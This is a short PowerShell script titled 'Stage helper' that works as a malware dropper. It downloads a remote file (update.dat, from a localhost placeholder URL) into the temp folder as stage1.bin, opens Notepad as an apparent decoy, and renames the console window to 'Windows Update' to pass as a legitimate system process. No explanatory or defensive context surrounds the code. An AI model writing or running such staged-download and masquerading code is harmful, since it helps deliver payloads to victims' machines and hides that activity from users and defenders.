# Stage helper
$Stage2Url = "https://127.0.0.1/update.dat"
$DropPath = "$env:TEMP\stage1.bin"
Invoke-WebRequest -Uri $Stage2Url -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "notepad.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
